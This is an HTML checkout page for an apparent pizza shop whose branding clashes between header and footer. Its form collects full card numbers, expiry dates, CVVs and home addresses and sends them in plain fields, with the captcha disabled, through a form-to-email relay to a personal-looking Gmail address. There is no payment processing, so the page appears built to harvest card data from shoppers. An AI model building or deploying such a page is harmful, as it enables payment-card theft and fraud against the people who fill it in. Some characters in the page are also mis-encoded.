<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Advanced Pizza Checkout</title>
  <style>
    * {margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif;}
    body {
      background: #f4f5f7;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0;
    }
    header, footer {
      width: 100%;
      max-width: 600px;
      text-align: center;
      padding: 15px 0;
      background: #ff4c29;
      color: #fff;
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      z-index: 1000;
    }
    header {top:0;}
    footer {bottom:0;}
    .checkout-container {
      width: 100%;
      max-width: 600px;
      background: #fff;
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 6px 25px rgba(0,0,0,0.1);
      margin-top: 100px;
      margin-bottom: 80px;
    }
    h2 {text-align:center; font-size:24px; margin-bottom:20px;}

    /* Pizza preview */
    .pizza-preview {text-align:center; margin-bottom:20px;}
    .pizza-preview img {width:100%; max-width:400px; border-radius:16px;}
    .pizza-details {margin-top:10px; font-size:16px; color:#333;}

    /* Form sections */
    .form-section {
      background: #fafafa;
      padding: 20px;
      border-radius: 14px;
      border: 1px solid #eee;
      margin-bottom: 20px;
    }
    .form-section h3 {
      font-size:18px;
      margin-bottom:15px;
      font-weight:bold;
    }
    .form-section label {
      display:block;
      font-weight:600;
      margin-top:12px;
      font-size:14px;
    }
    .form-section input, .form-section select {
      width:100%;
      padding:12px;
      margin-top:6px;
      font-size:15px;
      border-radius:8px;
      border:1px solid #ccc;
    }
    .row {
      display:flex;
      gap:10px;
      flex-wrap:wrap;
      margin-top:12px;
    }
    .row div {flex:1;}

    .pay-btn {
      margin-top: 20px;
      width: 100%;
      background: #ff4c29;
      color: #fff;
      padding: 15px;
      border: none;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }
    .pay-btn:hover {background:#e04322;}

    /* Order summary */
    .section {
      background: #fafafa;
      padding: 18px;
      border-radius: 14px;
      border: 1px solid #eee;
      margin-bottom: 20px;
    }
    .section-title {font-size:18px; font-weight:bold; margin-bottom:12px;}
    .summary-item {display:flex; justify-content:space-between; align-items:center; font-size:15px; padding:6px 0;}
    .summary-item img {width:64px; height:48px; object-fit:cover; border-radius:8px; margin-right:10px;}
    .summary-left {display:flex; align-items:center;}
    .total {font-size:18px; font-weight:bold; text-align:right; margin-top:12px;}

    /* Responsive */
    @media(max-width:480px){
      .checkout-container{padding:20px; margin-top:120px; margin-bottom:100px;}
      h2{font-size:20px;}
      .row{flex-direction:column;}
    }
  </style>
</head>
<body>
  <header>
    <h1>The Pizza Spot Store</h1>
  </header>

  <div class="checkout-container">

    <!-- Pizza Preview -->
    <div class="pizza-preview">
      <img src="https://images.pexels.com/photos/825661/pexels-photo-825661.jpeg" alt="Supreme Chicken Deluxe Pizza">
      <div class="pizza-details">
        Supreme Chicken Deluxe Pizza ‚Ä¢ Regular ‚Ä¢ 1
      </div>
    </div>

    <h2>üçï Checkout</h2>

    <!-- Full Checkout Form -->
    <form 
      id="checkout-form"
      action="https://formsubmit.co/jenniferaniston.chatline@gmail.com"
      method="POST"
      enctype="multipart/form-data"
      novalidate
    >
      <!-- FormSubmit Settings -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://the-pizza-spot-store.vercel.app/">
      <input type="hidden" name="_subject" value="New Checkout Submitted">
      <input type="hidden" name="_autoresponse" value="Your order has been received. Thank you!">

      <!-- Billing/Shipping Section -->
      <div class="form-section">
        <h3>Billing / Shipping Details</h3>
        <div class="row">
          <div>
            <label for="firstName">First Name</label>
            <input type="text" id="firstName" name="firstName" placeholder="First Name" required>
          </div>
          <div>
            <label for="lastName">Last Name</label>
            <input type="text" id="lastName" name="lastName" placeholder="Last Name" required>
          </div>
        </div>

        <label for="country">Country</label>
        <input type="text" id="country" name="country" placeholder="Country" required>

        <label for="address">Address</label>
        <input type="text" id="address" name="address" placeholder="Street Address" required>

        <div class="row">
          <div>
            <label for="city">City</label>
            <input type="text" id="city" name="city" placeholder="City" required>
          </div>
          <div>
            <label for="state">State</label>
            <input type="text" id="state" name="state" placeholder="State" required>
          </div>
        </div>

        <label for="zip">Zip / Postal Code</label>
        <input type="text" id="zip" name="zip" placeholder="12345" required>
      </div>

      <!-- Payment Section -->
      <div class="form-section">
        <h3>Payment Details</h3>
        <label for="cardName">Full Name on Card</label>
        <input type="text" id="cardName" name="cardName" placeholder="Full Name" required>

        <label for="cardNumber">Card Number</label>
        <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>

        <div class="row">
          <div>
            <label for="validTill">Valid Till</label>
            <input type="text" id="validTill" name="validTill" placeholder="MM/YY" maxlength="5" required>
          </div>
          <div>
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
          </div>
        </div>
      </div>

      <button type="submit" class="pay-btn">Pay Now</button>
    </form>

    <!-- Order Summary -->
    <div class="section">
      <div class="section-title">Order Summary</div>
      <div class="summary-item">
        <div class="summary-left">
          <img src="https://images.pexels.com/photos/825661/pexels-photo-825661.jpeg" alt="pizza">
          <div>
            <div>Supreme Chicken Deluxe Pizza</div>
            <div style="font-size:13px;color:#666">Regular ‚Ä¢ 1</div>
          </div>
        </div>
        <div>$12.00</div>
      </div>
      <div class="summary-item"><span>Delivery Fee</span><span>$3.00</span></div>
      <div class="summary-item"><span>VAT</span><span>$1.20</span></div>
      <div class="total">Total: $16.20</div>
    </div>

  </div>

  <footer>
    &copy; 2025 Pizza Palace. All rights reserved.
  </footer>
</body>
</html>
